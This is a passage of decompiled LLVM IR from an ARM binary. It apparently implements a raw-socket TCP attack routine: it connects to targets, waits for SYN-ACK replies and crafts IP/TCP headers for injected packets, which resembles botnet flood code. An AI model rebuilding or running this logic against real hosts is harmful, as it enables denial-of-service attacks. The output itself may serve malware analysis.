  br i1 %v7_cf74, label %dec_label_pc_d1f8, label %dec_label_pc_cf84

dec_label_pc_cf84:                                ; preds = %dec_label_pc_cd9c
  store i32 1, i32* %stack_var_-40, align 4
  %v6_cf8c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_cf8c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_cfa0 = call i32 @_setsockopt(i32 %v3_cf6c, i32 0, i32 3, i32 %v6_cf8c, i32 4)
  store i32 %v5_cfa0, i32* %r0.global-to-local, align 4
  %v7_cfa4 = icmp eq i32 %v5_cfa0, -1
  store i1 %v7_cfa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_cfa4, label %dec_label_pc_d1f0, label %dec_label_pc_cfac

dec_label_pc_cfac:                                ; preds = %dec_label_pc_cf84
  %v0_cfac = load i32, i32* @fp, align 4
  %v2_cfac = icmp eq i32 %v0_cfac, 0
  store i1 %v2_cfac, i1* %cpsr_z.global-to-local, align 1
  %v0_cfb0 = load i32, i32* @r6, align 4
  %v3_cfb0 = mul i32 %v0_cfb0, 65536
  store i32 %v3_cfb0, i32* %r0.global-to-local, align 4
  %v3_cfb4 = urem i32 %v0_cfb0, 65536
  store i32 %v3_cfb4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp84 = icmp slt i32 %v0_cfac, 1
  br i1 %tmp84, label %.thread26, label %dec_label_pc_cfd8.preheader

.thread26:                                        ; preds = %dec_label_pc_cfac
  store i32 0, i32* %stack_var_-40, align 4
  br label %dec_label_pc_d478

dec_label_pc_cfd8.preheader:                      ; preds = %dec_label_pc_cfac
  %v5_cfbc = load i32, i32* @r7, align 4
  %v8_cfbc = udiv i32 %v5_cfbc, 16777216
  %tmp85 = udiv i32 %v0_cfb0, 256
  %v8_cfc0 = urem i32 %tmp85, 256
  store i32 %v8_cfc0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v1_cfe4 = urem i32 %v0_cfb0, 256
  %v3_d0d0 = icmp ugt i32 %v0_cf70, -65537
  %v2_d0f4 = ptrtoint i32* %stack_var_-60 to i32
  %v4_d110 = mul nuw nsw i32 %v1_cfe4, 256
  %v5_d110 = or i32 %v8_cfc0, %v4_d110
  %sext10 = mul i32 %tmp85, 16777216
  %v4_d11c = sdiv i32 %sext10, 16777216
  %v3_d124 = ashr i32 %sext10, 31
  %v2_d148 = ptrtoint i32* %stack_var_-76 to i32
  %v2_d154 = ptrtoint i32* %stack_var_-332 to i32
  %v2_d158 = ptrtoint i32* %stack_var_-44 to i32
  %v4_d1a0 = zext i8 %tmp40 to i32
  %v4_d1a4 = zext i8 %tmp39 to i32
  %v4_d1b0 = mul nuw nsw i32 %v4_d1a4, 256
  %v4_d1c0 = zext i8 %tmp to i32
  %v1_d1c4 = and i32 %v4_d1c0, 18
  %v2_d1c8 = icmp eq i32 %v1_d1c4, 18
  %v1_d0e0 = mul nuw nsw i32 %v3_cf70, 256
  %v4_d0e4 = and i32 %v1_d0e0, 65280
  %v5_d0e4 = or i32 %v8_cfbc, %v4_d0e4
  %v3_d0e8106 = udiv i32 %v4_d0e4, 256
  %v1_d0ec = trunc i32 %v3_d0e8106 to i8
  %sext = mul i32 %v6_cde4, 16777216
  %v4_d2ec = sdiv i32 %sext, 16777216
  %sext8 = mul i32 %v5_ce20, 16777216
  %v4_d300 = sdiv i32 %sext8, 16777216
  %v5_d1b0 = or i32 %v4_d1a0, %v4_d1b0
  %v1_d1d0 = and i32 %v4_d1c0, 5
  %v2_d1d0 = icmp eq i32 %v1_d1d0, 0
  %v1_d0f0 = trunc i32 %v8_cfbc to i8
  %v1_d2fc = trunc i32 %v4_d2ec to i8
  %v1_d3c8 = urem i32 %v5_ce7c, 2
  %tmp107 = sub nsw i32 0, %v1_d3c8
  %v4_d3d0 = and i32 %tmp107, 32
  %v1_d3e0 = urem i32 %v6_ce9c, 2
  %tmp108 = sub nsw i32 0, %v1_d3e0
  %v4_d3e8 = and i32 %tmp108, 16
  %v1_d3f8 = urem i32 %v6_cebc, 2
  %tmp109 = sub nsw i32 0, %v1_d3f8
  %v4_d400 = and i32 %tmp109, 8
  %v1_d410 = urem i32 %v6_cedc, 2
  %tmp110 = sub nsw i32 0, %v1_d410
  %v4_d418 = and i32 %tmp110, 4
  %v1_d428 = urem i32 %v6_cefc, 2
  %tmp111 = sub nsw i32 0, %v1_d428
  %v3_d430 = and i32 %tmp111, 2
  br label %dec_label_pc_cfd8

dec_label_pc_cfd8:                                ; preds = %dec_label_pc_d464, %dec_label_pc_d1d8, %dec_label_pc_cfd8.preheader
  store i32 %v8_cfc0, i32* %r3.global-to-local, align 4
  store i32 %v1_cfe4, i32* %ip.global-to-local, align 4
  %v0_cff0 = load i32, i32* @sb, align 4
  %v1_cff0 = add i32 %v0_cff0, 40
  store i32 %v1_cff0, i32* @sl, align 4
  br label %dec_label_pc_cff4

dec_label_pc_cff4:                                ; preds = %dec_label_pc_d1e4, %dec_label_pc_cfd8
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d000 = call i32 @_socket(i32 2, i32 1, i32 0)
  store i32 %v3_d000, i32* %r0.global-to-local, align 4
  %v7_d004 = icmp eq i32 %v3_d000, -1
  store i1 %v7_d004, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_d000, i32* @r7, align 4
  br i1 %v7_d004, label %dec_label_pc_d464, label %dec_label_pc_d010

dec_label_pc_d010:                                ; preds = %dec_label_pc_cff4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d018 = call i32 @_fcntl(i32 %v3_d000, i32 3, i32 0)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_d020 = or i32 %v3_d018, 2048
  store i32 %v1_d020, i32* %r2.global-to-local, align 4
  %v0_d024 = load i32, i32* @r7, align 4
  store i32 %v0_d024, i32* %r0.global-to-local, align 4
  %v3_d028 = call i32 @_fcntl(i32 %v0_d024, i32 4, i32 %v1_d020)
  %v3_d02c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d02c, i32* %ip.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  %v5_d048 = mul i32 %v3_d02c, 24
  store i32 %v5_d048, i32* %r1.global-to-local, align 4
  %v2_d04c = add i32 %v5_d048, %arg2
  store i32 %v2_d04c, i32* %r2.global-to-local, align 4
  %v1_d050 = add i32 %v2_d04c, 20
  %v2_d050 = inttoptr i32 %v1_d050 to i8*
  %v3_d050 = load i8, i8* %v2_d050, align 1
  %v4_d050 = zext i8 %v3_d050 to i32
  store i32 %v4_d050, i32* %r3.global-to-local, align 4
  %v2_d054 = icmp ugt i8 %v3_d050, 30
  %v7_d054 = icmp eq i8 %v3_d050, 31
  store i1 %v7_d054, i1* %cpsr_z.global-to-local, align 1
  %v2_d058 = xor i1 %v7_d054, true
  %v3_d058 = and i1 %v2_d054, %v2_d058
  %v5_d058 = add i32 %v2_d04c, 16
  %v6_d058 = inttoptr i32 %v5_d058 to i32*
  %v7_d058 = load i32, i32* %v6_d058, align 4
  br i1 %v3_d058, label %dec_label_pc_d0c4, label %dec_label_pc_d064

dec_label_pc_d064:                                ; preds = %dec_label_pc_d010
  store i32 %v7_d058, i32* %r4.global-to-local, align 4
  %v0_d068 = call i32 @function_117dc()
  store i32 %v0_d068, i32* %r0.global-to-local, align 4
  %v3_d06c = load i32, i32* %stack_var_-40, align 4
  %v5_d074 = mul i32 %v3_d06c, 24
  %v2_d080 = add i32 %v5_d074, %arg2
  store i32 %v2_d080, i32* %r1.global-to-local, align 4
  %v1_d07c = udiv i32 %v7_d058, 256
  %v3_d084 = and i32 %v1_d07c, 65280
  store i32 %v3_d084, i32* %r2.global-to-local, align 4
  %v1_d088 = and i32 %v7_d058, 65280
  store i32 %v1_d088, i32* %r3.global-to-local, align 4
  %v3_d08c = mul i32 %v7_d058, 16777216
  store i32 %v3_d08c, i32* %ip.global-to-local, align 4
  %v1_d090 = add i32 %v2_d080, 20
  %v2_d090 = inttoptr i32 %v1_d090 to i8*
  %v3_d090 = load i8, i8* %v2_d090, align 1
  %v4_d090 = zext i8 %v3_d090 to i32
  store i32 %v4_d090, i32* %lr.global-to-local, align 4
  %v4_d094 = mul nuw nsw i32 %v1_d088, 256
  %v5_d094 = or i32 %v4_d094, %v3_d08c
  store i32 %v5_d094, i32* %ip.global-to-local, align 4
  %v2_d09c = call i32 @llvm.bswap.i32(i32 %v7_d058)
  %v7_d0a0 = lshr i32 %v0_d068, %v4_d090
  %v8_d0a0 = add i32 %v7_d0a0, %v2_d09c
  store i32 %v8_d0a0, i32* %r2.global-to-local, align 4
  %v3_d0ac = mul i32 %v8_d0a0, 16777216
  %v1_d0b0 = and i32 %v8_d0a0, 65280
  store i32 %v1_d0b0, i32* %r0.global-to-local, align 4
  %v4_d0b4 = mul nuw nsw i32 %v1_d0b0, 256
  %v5_d0b4 = or i32 %v4_d0b4, %v3_d0ac
  store i32 %v5_d0b4, i32* %r1.global-to-local, align 4
  %v2_d0bc = call i32 @llvm.bswap.i32(i32 %v8_d0a0)
  br label %dec_label_pc_d0c4

dec_label_pc_d0c4:                                ; preds = %dec_label_pc_d010, %dec_label_pc_d064
  %storemerge34 = phi i32 [ %v2_d0bc, %dec_label_pc_d064 ], [ %v7_d058, %dec_label_pc_d010 ]
  store i32 %v3_cf70, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_d0d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d0d0, label %dec_label_pc_d200, label %dec_label_pc_d0d8

dec_label_pc_d0d8:                                ; preds = %dec_label_pc_d0c4
  store i32 %v3_cf70, i32* %r0.global-to-local, align 4
  store i32 %v8_cfbc, i32* %r1.global-to-local, align 4
  store i32 %v5_d0e4, i32* %r3.global-to-local, align 4
  store i32 %v3_d0e8106, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d0f4

dec_label_pc_d0f4:                                ; preds = %dec_label_pc_d200, %dec_label_pc_d0d8
  %stack_var_-57.0 = phi i8 [ %v1_d208, %dec_label_pc_d200 ], [ %v1_d0ec, %dec_label_pc_d0d8 ]
  %storemerge = phi i8 [ %v1_d200, %dec_label_pc_d200 ], [ %v1_d0f0, %dec_label_pc_d0d8 ]
  store i32 %v2_d0f4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_d0fc = load i32, i32* @r7, align 4
  store i32 %v0_d0fc, i32* %r0.global-to-local, align 4
  %v3_d100 = call i32 @_connect(i32 %v0_d0fc, i32 %v2_d0f4, i32 16)
  store i32 %v1_cfe4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v5_d110, i32* %r2.global-to-local, align 4
  %v1_d118 = call i32 @_time(i32 0)
  store i32 %v1_d118, i32* %r0.global-to-local, align 4
  store i32 %v1_d118, i32* %r4.global-to-local, align 4
  store i32 %v3_d124, i32* %ip.global-to-local, align 4
  %v9_d184 = icmp eq i32 %tmp41, %storemerge34
  %v4_d1a8 = zext i8 %storemerge to i32
  %v4_d1ac = zext i8 %stack_var_-57.0 to i32
  %. = zext i1 %v9_d184 to i32
  %v9_d198 = icmp eq i1 %v9_d184, false
  %v4_d1b4 = mul nuw nsw i32 %v4_d1ac, 256
  %v5_d1b4 = or i32 %v4_d1b4, %v4_d1a8
  %v9_d1b8 = icmp eq i32 %v5_d1b4, %v5_d1b0
  br label %dec_label_pc_d140

dec_label_pc_d130:                                ; preds = %.thread32, %dec_label_pc_d1a0, %dec_label_pc_d1d0, %bb87
  %v1_d130 = call i32 @_time(i32 0)
  %v0_d134 = load i32, i32* %r4.global-to-local, align 4
  %v2_d134 = sub i32 %v1_d130, %v0_d134
  store i32 %v2_d134, i32* %r0.global-to-local, align 4
  %v7_d138 = icmp eq i32 %v2_d134, 10
  store i1 %v7_d138, i1* %cpsr_z.global-to-local, align 1
  %v8_d13c = icmp sgt i32 %v2_d134, 10
  br i1 %v8_d13c, label %dec_label_pc_d1e4, label %dec_label_pc_d140

dec_label_pc_d140:                                ; preds = %dec_label_pc_d130, %dec_label_pc_d0f4
  store i32 16, i32* %stack_var_-44, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_d154, i32* %r1.global-to-local, align 4
  store i32 %v2_d158, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_cf6c, i32* %r0.global-to-local, align 4
  %v6_d168 = call i32 @_recvfrom(i32 %v3_cf6c, i32 %v2_d154, i32 256, i32 16384, i32 %v2_d148, i32 %v2_d158)
  store i32 %v6_d168, i32* %r2.global-to-local, align 4
  %v7_d170 = icmp eq i32 %v6_d168, -1
  store i1 %v7_d170, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_d170, label %dec_label_pc_d1f8, label %dec_label_pc_d17c

dec_label_pc_d17c:                                ; preds = %dec_label_pc_d140
  store i32 %storemerge34, i32* %lr.global-to-local, align 4
  store i32 %tmp41, i32* %r3.global-to-local, align 4
  store i32 %., i32* %r1.global-to-local, align 4
  %v7_d190 = icmp eq i32 %v6_d168, 40
  store i1 %v7_d190, i1* %cpsr_z.global-to-local, align 1
  %tmp112 = icmp ult i32 %v6_d168, 41
  br i1 %tmp112, label %.thread32, label %bb87

.thread32:                                        ; preds = %dec_label_pc_d17c
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_d130

bb87:                                             ; preds = %dec_label_pc_d17c
  store i1 %v9_d198, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d198, label %dec_label_pc_d130, label %dec_label_pc_d1a0

dec_label_pc_d1a0:                                ; preds = %bb87
  store i32 %v4_d1a4, i32* %r1.global-to-local, align 4
  store i32 %v4_d1a8, i32* %ip.global-to-local, align 4
  store i32 %v4_d1ac, i32* %r2.global-to-local, align 4
  store i32 %v5_d1b0, i32* %r3.global-to-local, align 4
  store i32 %v5_d1b4, i32* @r5, align 4
  store i1 %v9_d1b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d1b8, label %dec_label_pc_d1c0, label %dec_label_pc_d130

dec_label_pc_d1c0:                                ; preds = %dec_label_pc_d1a0
  store i32 %v4_d1c0, i32* %r2.global-to-local, align 4
  store i32 %v1_d1c4, i32* %r3.global-to-local, align 4
  store i1 %v2_d1c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d1c8, label %dec_label_pc_d214, label %dec_label_pc_d1d0

dec_label_pc_d1d0:                                ; preds = %dec_label_pc_d1c0
  store i1 %v2_d1d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d1d0, label %dec_label_pc_d130, label %dec_label_pc_d1d8

dec_label_pc_d1d8:                                ; preds = %dec_label_pc_d1d0
  %v0_d1d8 = load i32, i32* @r7, align 4
  store i32 %v0_d1d8, i32* %r0.global-to-local, align 4
  %v1_d1dc = call i32 @_close(i32 %v0_d1d8)
  store i32 %v1_d1dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cfd8

dec_label_pc_d1e4:                                ; preds = %dec_label_pc_d130
  %v0_d1e4 = load i32, i32* @r7, align 4
  store i32 %v0_d1e4, i32* %r0.global-to-local, align 4
  %v1_d1e8 = call i32 @_close(i32 %v0_d1e4)
  store i32 %v1_d1e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cff4

dec_label_pc_d1f0:                                ; preds = %dec_label_pc_cf84
  store i32 %v3_cf6c, i32* %r0.global-to-local, align 4
  %v1_d1f4 = call i32 @_close(i32 %v3_cf6c)
  store i32 %v1_d1f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d1f8

dec_label_pc_d1f8:                                ; preds = %dec_label_pc_d140, %dec_label_pc_cd9c, %dec_label_pc_d1f0
  %v29_d1fc = phi i32 [ %v3_cf6c, %dec_label_pc_cd9c ], [ %v1_d1f4, %dec_label_pc_d1f0 ], [ 0, %dec_label_pc_d140 ]
  store i32 %v3_cd9c, i32* %r4.global-to-local, align 4
  ret i32 %v29_d1fc

dec_label_pc_d200:                                ; preds = %dec_label_pc_d0c4
  %v0_d200 = call i32 @function_117dc()
  %v1_d200 = trunc i32 %v0_d200 to i8
  store i32 %v0_d200, i32* %r0.global-to-local, align 4
  %v4_d204 = sdiv i32 %v0_d200, 256
  store i32 %v4_d204, i32* %r3.global-to-local, align 4
  %v1_d208 = trunc i32 %v4_d204 to i8
  br label %dec_label_pc_d0f4

dec_label_pc_d214:                                ; preds = %dec_label_pc_d1c0
  %v3_d214 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d214, i32* %r4.global-to-local, align 4
  store i32 %v2_cdbc, i32* %r2.global-to-local, align 4
  %v3_d21c = mul i32 %v3_d214, 16
  store i32 %v3_d21c, i32* %ip.global-to-local, align 4
  %v3_d220 = add i32 %v3_d21c, %v2_cdbc
  %v4_d220 = inttoptr i32 %v3_d220 to i32*
  store i32 %storemerge34, i32* %v4_d220, align 4
  %v0_d224 = load i32, i32* @r6, align 4
  %v1_d224 = add i32 %v0_d224, 4
  %v2_d224 = inttoptr i32 %v1_d224 to i32*
  %v3_d224 = load i32, i32* %v2_d224, align 4
  %v1_d230 = and i32 %v3_d224, 65280
  store i32 %v1_d230, i32* %r1.global-to-local, align 4
  %v3_d234 = mul i32 %v3_d224, 16777216
  store i32 %v2_cdbc, i32* %r0.global-to-local, align 4
  %v4_d240 = mul nuw nsw i32 %v1_d230, 256
  %v5_d240 = or i32 %v4_d240, %v3_d234
  store i32 %v5_d240, i32* %r2.global-to-local, align 4
  %v1_d244 = load i32, i32* %ip.global-to-local, align 4
  %v2_d244 = add i32 %v1_d244, %v2_cdbc
  store i32 %v2_d244, i32* %ip.global-to-local, align 4
  %v2_d248 = call i32 @llvm.bswap.i32(i32 %v3_d224)
  store i32 %v2_d248, i32* %r3.global-to-local, align 4
  %v2_d24c = add i32 %v2_d244, 4
  %v3_d24c = inttoptr i32 %v2_d24c to i32*
  store i32 %v2_d248, i32* %v3_d24c, align 4
  %v0_d250 = load i32, i32* @r6, align 4
  %v1_d250 = add i32 %v0_d250, 8
  %v2_d250 = inttoptr i32 %v1_d250 to i32*
  %v3_d250 = load i32, i32* %v2_d250, align 4
  store i32 %v3_d250, i32* %r0.global-to-local, align 4
  %v1_d258 = and i32 %v3_d250, 65280
  store i32 %v1_d258, i32* %r1.global-to-local, align 4
  %v3_d25c = mul i32 %v3_d250, 16777216
  %v4_d264 = mul nuw nsw i32 %v1_d258, 256
  %v5_d264 = or i32 %v4_d264, %v3_d25c
  store i32 %v5_d264, i32* %r2.global-to-local, align 4
  %v2_d26c = call i32 @llvm.bswap.i32(i32 %v3_d250)
  store i32 %v2_d26c, i32* %r3.global-to-local, align 4
  %v1_d270 = load i32, i32* %ip.global-to-local, align 4
  %v2_d270 = add i32 %v1_d270, 8
  %v3_d270 = inttoptr i32 %v2_d270 to i32*
  store i32 %v2_d26c, i32* %v3_d270, align 4
  %v0_d274 = load i32, i32* @r6, align 4
  %v1_d274 = inttoptr i32 %v0_d274 to i32*
  %v2_d274 = load i32, i32* %v1_d274, align 4
  %v3_d278 = udiv i32 %v2_d274, 65536
  store i32 %v3_d278, i32* %r2.global-to-local, align 4
  %v3_d27c5 = udiv i32 %v2_d274, 16777216
  store i32 %v3_d27c5, i32* %r1.global-to-local, align 4
  %v0_d280 = load i32, i32* @r5, align 4
  %v3_d280 = sdiv i32 %v0_d280, 256
  store i32 %v3_d280, i32* %r3.global-to-local, align 4
  %v1_d284 = trunc i32 %v3_d280 to i8
  %v2_d284 = load i32, i32* %ip.global-to-local, align 4
  %v3_d284 = add i32 %v2_d284, 15
  %v4_d284 = inttoptr i32 %v3_d284 to i8*
  store i8 %v1_d284, i8* %v4_d284, align 1
  %v0_d288 = load i32, i32* %r1.global-to-local, align 4
  %v1_d288 = trunc i32 %v0_d288 to i8
  %v2_d288 = load i32, i32* %ip.global-to-local, align 4
  %v3_d288 = add i32 %v2_d288, 13
  %v4_d288 = inttoptr i32 %v3_d288 to i8*
  store i8 %v1_d288, i8* %v4_d288, align 1
  %v0_d28c = load i32, i32* %r2.global-to-local, align 4
  %v1_d28c = trunc i32 %v0_d28c to i8
  %v2_d28c = load i32, i32* %ip.global-to-local, align 4
  %v3_d28c = add i32 %v2_d28c, 12
  %v4_d28c = inttoptr i32 %v3_d28c to i8*
  store i8 %v1_d28c, i8* %v4_d28c, align 1
  %v0_d290 = load i32, i32* @r5, align 4
  %v1_d290 = trunc i32 %v0_d290 to i8
  %v2_d290 = load i32, i32* %ip.global-to-local, align 4
  %v3_d290 = add i32 %v2_d290, 14
  %v4_d290 = inttoptr i32 %v3_d290 to i8*
  store i8 %v1_d290, i8* %v4_d290, align 1
  %v0_d294 = load i32, i32* @sl, align 4
  store i32 %v0_d294, i32* %r0.global-to-local, align 4
  %v1_d298 = call i32 @_malloc(i32 %v0_d294)
  store i32 %v1_d298, i32* %r0.global-to-local, align 4
  store i32 %v2_cdcc, i32* %r1.global-to-local, align 4
  %v3_d2a0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d2a0, i32* %r2.global-to-local, align 4
  %v2_d2a4 = load i32, i32* %r4.global-to-local, align 4
  %v5_d2a4 = mul i32 %v2_d2a4, 4
  %v6_d2a4 = add i32 %v5_d2a4, %v2_cdcc
  %v7_d2a4 = inttoptr i32 %v6_d2a4 to i32*
  store i32 %v1_d298, i32* %v7_d2a4, align 4
  %v0_d2a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_d2a8 = load i32, i32* %r2.global-to-local, align 4
  %v4_d2a8 = mul i32 %v1_d2a8, 4
  %v5_d2a8 = add i32 %v4_d2a8, %v0_d2a8
  %v6_d2a8 = inttoptr i32 %v5_d2a8 to i32*
  %v7_d2a8 = load i32, i32* %v6_d2a8, align 4
  store i32 %v7_d2a8, i32* @r4, align 4
  %v1_d2ac = inttoptr i32 %v7_d2a8 to i8*
  %v2_d2ac = load i8, i8* %v1_d2ac, align 1
  %tmp113 = urem i8 %v2_d2ac, 16
  %v1_d2b0 = zext i8 %tmp113 to i32
  %v1_d2b4 = or i32 %v1_d2b0, 64
  store i32 %v1_d2b4, i32* %r3.global-to-local, align 4
  %v1_d2b8 = trunc i32 %v1_d2b4 to i8
  store i8 %v1_d2b8, i8* %v1_d2ac, align 1
  %v0_d2bc = load i32, i32* @sl, align 4
  %v3_d2bc = mul i32 %v0_d2bc, 65536
  store i32 %v3_d2bc, i32* %r2.global-to-local, align 4
  %v0_d2c0 = load i32, i32* @r4, align 4
  %v1_d2c0 = inttoptr i32 %v0_d2c0 to i8*
  %v2_d2c0 = load i8, i8* %v1_d2c0, align 1
  %v1_d2c8 = urem i32 %v0_d2bc, 256
  %tmp88 = udiv i32 %v0_d2bc, 256
  %v3_d2cc = urem i32 %tmp88, 256
  %v1_d2d0 = and i8 %v2_d2c0, -16
  %v4_d2d4 = mul nuw nsw i32 %v1_d2c8, 256
  %v5_d2d4 = or i32 %v4_d2d4, %v3_d2cc
  store i32 %v5_d2d4, i32* %r2.global-to-local, align 4
  %v1_d2d8 = or i8 %v1_d2d0, 5
  store i32 %v1_ce4c, i32* %ip.global-to-local, align 4
  store i32 %v1_d2c8, i32* %r3.global-to-local, align 4
  store i8 %v1_d2d8, i8* %v1_d2c0, align 1
  %v0_d2e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_d2e8 = trunc i32 %v0_d2e8 to i8
  %v2_d2e8 = load i32, i32* @r4, align 4
  %v3_d2e8 = add i32 %v2_d2e8, 3
  %v4_d2e8 = inttoptr i32 %v3_d2e8 to i8*
  store i8 %v1_d2e8, i8* %v4_d2e8, align 1
  store i32 %v4_d2ec, i32* %r3.global-to-local, align 4
  %v0_d2f0 = load i32, i32* %ip.global-to-local, align 4
  %v2_d2f0 = icmp eq i32 %v0_d2f0, 0
  store i1 %v2_d2f0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_d11c, i32* %r0.global-to-local, align 4
  store i32 %v3_d124, i32* %r1.global-to-local, align 4
  %v2_d2fc = load i32, i32* @r4, align 4
  %v3_d2fc = add i32 %v2_d2fc, 1
  %v4_d2fc = inttoptr i32 %v3_d2fc to i8*
  store i8 %v1_d2fc, i8* %v4_d2fc, align 1
  store i32 %v4_d300, i32* %ip.global-to-local, align 4
  %v0_d304 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d304, label %bb90, label %bb89

bb89:                                             ; preds = %dec_label_pc_d214
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb90

bb90:                                             ; preds = %dec_label_pc_d214, %bb89
  %v0_d308 = load i32, i32* %r2.global-to-local, align 4
  %v1_d308 = trunc i32 %v0_d308 to i8
  %v2_d308 = load i32, i32* @r4, align 4
  %v3_d308 = add i32 %v2_d308, 2
  %v4_d308 = inttoptr i32 %v3_d308 to i8*
  store i8 %v1_d308, i8* %v4_d308, align 1
  %v0_d30c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d30c, label %.thread9, label %bb91

bb91:                                             ; preds = %bb90
  %v1_d30c = load i32, i32* %r3.global-to-local, align 4
  %v2_d30c = trunc i32 %v1_d30c to i8
  %v3_d30c = load i32, i32* @r4, align 4
  %v4_d30c = add i32 %v3_d30c, 6
  %v5_d30c = inttoptr i32 %v4_d30c to i8*
  store i8 %v2_d30c, i8* %v5_d30c, align 1
  %v0_d310.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d310.pr, label %.thread9, label %bb92

bb92:                                             ; preds = %bb91
  store i32 0, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb90, %bb91, %bb92
  store i32 6, i32* %r3.global-to-local, align 4
  %v0_d318 = load i32, i32* %ip.global-to-local, align 4
  %v1_d318 = trunc i32 %v0_d318 to i8
  %v2_d318 = load i32, i32* @r4, align 4
  %v3_d318 = add i32 %v2_d318, 8
  %v4_d318 = inttoptr i32 %v3_d318 to i8*
  store i8 %v1_d318, i8* %v4_d318, align 1
  %v0_d31c = load i32, i32* %r3.global-to-local, align 4
  %v1_d31c = trunc i32 %v0_d31c to i8
  %v2_d31c = load i32, i32* @r4, align 4
  %v3_d31c = add i32 %v2_d31c, 9
  %v4_d31c = inttoptr i32 %v3_d31c to i8*
  store i8 %v1_d31c, i8* %v4_d31c, align 1
  %v0_d320 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d320, label %bb94, label %bb93

bb93:                                             ; preds = %.thread9
  %v1_d320 = load i32, i32* %r2.global-to-local, align 4
  %v2_d320 = trunc i32 %v1_d320 to i8
  %v3_d320 = load i32, i32* @r4, align 4
  %v4_d320 = add i32 %v3_d320, 7
  %v5_d320 = inttoptr i32 %v4_d320 to i8*
  store i8 %v2_d320, i8* %v5_d320, align 1
  br label %bb94

bb94:                                             ; preds = %.thread9, %bb93
  %v2_d328 = load i32, i32* @global_var_1d9ac.143, align 4
  store i32 %v2_d328, i32* %r3.global-to-local, align 4
  %v1_d32c = load i32, i32* @r4, align 4
  %v2_d32c = add i32 %v1_d32c, 12
  %v3_d32c = inttoptr i32 %v2_d32c to i32*
  store i32 %v2_d328, i32* %v3_d32c, align 4
  %v0_d330 = load i32, i32* %r0.global-to-local, align 4
  %v1_d330 = trunc i32 %v0_d330 to i8
  %v2_d330 = load i32, i32* @r4, align 4
  %v3_d330 = add i32 %v2_d330, 4
  %v4_d330 = inttoptr i32 %v3_d330 to i8*
  store i8 %v1_d330, i8* %v4_d330, align 1
  %v3_d334 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d334, i32* %r2.global-to-local, align 4
  store i32 %v2_cdbc, i32* %r0.global-to-local, align 4
  %v4_d33c = mul i32 %v3_d334, 16
  %v5_d33c = add i32 %v4_d33c, %v2_cdbc
  %v6_d33c = inttoptr i32 %v5_d33c to i32*
  %v7_d33c = load i32, i32* %v6_d33c, align 4
  store i32 %v7_d33c, i32* %r3.global-to-local, align 4
  %v0_d340 = load i32, i32* %r1.global-to-local, align 4
  %v1_d340 = trunc i32 %v0_d340 to i8
  %v2_d340 = load i32, i32* @r4, align 4
  %v3_d340 = add i32 %v2_d340, 5
  %v4_d340 = inttoptr i32 %v3_d340 to i8*
  store i8 %v1_d340, i8* %v4_d340, align 1
  %v0_d344 = load i32, i32* %r3.global-to-local, align 4
  %v1_d344 = load i32, i32* @r4, align 4
  %v2_d344 = add i32 %v1_d344, 16
  %v3_d344 = inttoptr i32 %v2_d344 to i32*
  store i32 %v0_d344, i32* %v3_d344, align 4
  %v0_d348 = load i32, i32* %r2.global-to-local, align 4
  %v3_d348 = mul i32 %v0_d348, 16
  %v1_d34c = load i32, i32* %r0.global-to-local, align 4
  %v2_d34c = add i32 %v1_d34c, %v3_d348
  store i32 %v2_d34c, i32* %r2.global-to-local, align 4
  %v1_d350 = add i32 %v2_d34c, 13
  %v2_d350 = inttoptr i32 %v1_d350 to i8*
  %v3_d350 = load i8, i8* %v2_d350, align 1
  %v4_d350 = zext i8 %v3_d350 to i32
  store i32 %v4_d350, i32* %r1.global-to-local, align 4
  %v1_d354 = add i32 %v2_d34c, 12
  %v2_d354 = inttoptr i32 %v1_d354 to i8*
  %v3_d354 = load i8, i8* %v2_d354, align 1
